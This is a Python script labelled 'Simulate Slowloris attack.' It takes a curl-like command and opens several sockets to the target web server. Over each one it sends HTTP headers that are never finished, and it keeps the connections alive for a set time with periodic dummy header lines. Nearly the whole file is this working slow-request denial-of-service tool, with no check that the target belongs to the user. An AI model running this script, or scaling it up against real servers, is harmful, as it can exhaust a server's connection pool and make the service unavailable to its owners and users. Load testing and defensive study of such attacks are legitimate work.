import socket
import time
import argparse
import shlex
from urllib.parse import urlparse

# Number of connections
connection_count = 10

# Client side timeout
client_timeout = 4

# Create a list to store all socket objects
sockets = []

VALID_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'CONNECT']

def valid_method(method):
    """Check if the provided method is a valid HTTP method."""
    if method.upper() in VALID_METHODS:
        return method.upper()
    else:
        raise argparse.ArgumentTypeError(f"'{method}' is not a valid HTTP method. Choose from {', '.join(VALID_METHODS)}.")

def parse_command(command):
    """Parses the curl-like command into components."""
    args = shlex.split(command)
    headers = {}
    url = ""
    method = "GET"  # Default method
    for i, arg in enumerate(args):
        if arg == '--header':
            header = args[i + 1]
            key, value = header.split(': ')
            headers[key] = value
        elif arg.startswith('http'):
            url = arg
    return method, url, headers


def setup_connections(method, url, headers, host, port, sockets, client_timeout):
    """Sets up socket connections based on the parsed URL, headers, and method."""
    path = urlparse(url).path + "?" + urlparse(url).query
    header_lines = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}"
    ]
    print("HEADER")
    print(header_lines)
    for key, value in headers.items():
        header_lines.append(f"{key}: {value}")
    header_lines.append("Connection: keep-alive")

    for _ in range(connection_count):
        try:
            # Create socket and connect to server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(client_timeout)
            s.connect((host, port))

            # Send initial part of the request (simulate slow sending)
            s.send("\r\n".join(header_lines).encode() + b"\r\n")
            sockets.append(s)
            print(f"Connected and sent initial headers to {host}:{port}")
        except socket.error as err:
            print(f"Failed to create a connection: {err}")

def maintain_connections(start_time, sockets, host, port):
    try:
        for s in sockets:
            elapsed = time.time() - start_time
            print(f"Elapsed Time: {int(elapsed)} seconds")
            # Continue sending incomplete headers to keep connection alive
            s.send(b"X-Dummy: " + bytes(f"{time.time()}", 'utf-8') + b"\r\n")
            time.sleep(0.5)  # Sleep to simulate slow sending
            print(f"Sent keep-alive headers to {host}:{port}")
            # Optionally read response
            try:
                response = s.recv(1024)  # Read buffer size can be adjusted
                if response:
                    print(f"Received response from {host}:{port}: {response.decode()}")
            except socket.timeout:
                print(f"No response received within timeout period from {host}:{port}")
            except socket.error as e:
                print(f"Error receiving data from {host}:{port}: {e}")
    except socket.error as err:
        print(f"Error sending data: {err}")

def main(method, command, duration=15):
    _, url, headers = parse_command(command)
    parsed_url = urlparse(url)
    host, port = parsed_url.hostname, parsed_url.port if parsed_url.port else 80
    sockets = []
    start_time = time.time()
    try:
        setup_connections(method, url, headers, host, port, sockets, client_timeout)
        while time.time() - start_time < duration:
            maintain_connections(start_time, sockets, host, port)
        for s in sockets:
            s.close()
    except KeyboardInterrupt:
        for s in sockets:
            s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate Slowloris attack.")
    parser.add_argument("-m", "--method", type=valid_method, default="GET", help="HTTP method to use for the requests (GET, POST, etc.)")
    parser.add_argument("command", type=str, help="Curl-like command to be simulated.")
    args = parser.parse_args()
    main(args.method, args.command)
